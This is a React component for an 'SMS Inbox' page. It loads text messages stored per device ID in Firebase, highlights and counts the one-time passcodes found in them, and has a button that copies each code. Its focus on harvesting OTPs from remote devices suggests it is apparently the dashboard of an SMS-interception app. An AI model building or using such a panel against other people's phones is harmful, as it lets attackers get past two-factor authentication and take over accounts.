import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase/config';
import './SmsInboxPage.css';

function SmsInboxPage() {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [smsList, setSmsList] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState('all');

  useEffect(() => {
    if (deviceId) {
      loadSMS();
    }
  }, [deviceId]);

  const loadSMS = () => {
    setLoading(true);
    const inboxRef = ref(db, `inbox/${deviceId}`);
    const unsubscribe = onValue(inboxRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        const smsArray = Object.entries(data).map(([key, value]) => ({
          id: key,
          ...value,
          time: Number(value.time) || 0
        }));
        smsArray.sort((a, b) => b.time - a.time);
        setSmsList(smsArray);
      } else {
        setSmsList([]);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  };

  const formatTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(Number(timestamp));
    const now = new Date();
    const diff = now - date;
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    if (diff < 604800000) return `${Math.floor(diff / 86400000)}d ago`;
    return date.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
  };

  const extractOTP = (message) => {
    if (!message) return null;
    const match = message.match(/\b(\d{4,8})\b/);
    return match ? match[1] : null;
  };

  const getFilteredSMS = () => {
    let filtered = smsList;
    
    if (filter === 'otp') {
      filtered = filtered.filter(sms => extractOTP(sms.message));
    } else if (filter === 'normal') {
      filtered = filtered.filter(sms => !extractOTP(sms.message));
    }
    
    if (searchTerm) {
      filtered = filtered.filter(sms => 
        sms.sender?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        sms.message?.toLowerCase().includes(searchTerm.toLowerCase())
      );
    }
    
    return filtered;
  };

  const filteredSMS = getFilteredSMS();

  if (loading) {
    return (
      <div className="page-loading">
        <div className="loading-spinner"></div>
        <p>📡 Loading SMS...</p>
      </div>
    );
  }

  return (
    <div className="sms-inbox-page">
      {/* Header */}
      <div className="sms-header">
       
        <h2>📩 SMS Inbox</h2>
        <span className="sms-count">{smsList.length}</span>
      </div>

      {/* Search */}
      <div className="search-bar">
        <input
          type="text"
          placeholder="🔍 Search messages..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="search-input"
        />
      </div>

      {/* Filters */}
      <div className="filter-buttons">
        <button 
          className={`filter-btn ${filter === 'all' ? 'active' : ''}`}
          onClick={() => setFilter('all')}
        >
          All ({smsList.length})
        </button>
        <button 
          className={`filter-btn ${filter === 'otp' ? 'active' : ''}`}
          onClick={() => setFilter('otp')}
        >
          🔑 OTP ({smsList.filter(s => extractOTP(s.message)).length})
        </button>
        <button 
          className={`filter-btn ${filter === 'normal' ? 'active' : ''}`}
          onClick={() => setFilter('normal')}
        >
          📝 Normal ({smsList.filter(s => !extractOTP(s.message)).length})
        </button>
      </div>

      {/* SMS List */}
      {filteredSMS.length === 0 ? (
        <div className="sms-empty">
          <span className="empty-icon">📭</span>
          <p>No SMS found</p>
        </div>
      ) : (
        <div className="sms-list">
          {filteredSMS.map((sms) => {
            const otp = extractOTP(sms.message);
            return (
              <div key={sms.id} className={`sms-item ${otp ? 'has-otp' : ''}`}>
                <div className="sms-item-header">
                  <span className="sms-sender">{sms.sender || 'Unknown'}</span>
                  <span className="sms-time">{formatTime(sms.time)}</span>
                </div>
                <div className="sms-message">{sms.message || 'No message'}</div>
                {otp && (
                  <div className="sms-otp-box">
                    <span>🔑 OTP: <strong>{otp}</strong></span>
                    <button 
                      className="copy-btn"
                      onClick={() => {
                        navigator.clipboard.writeText(otp);
                        alert('OTP copied!');
                      }}
                    >
                      📋 Copy
                    </button>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

export default SmsInboxPage;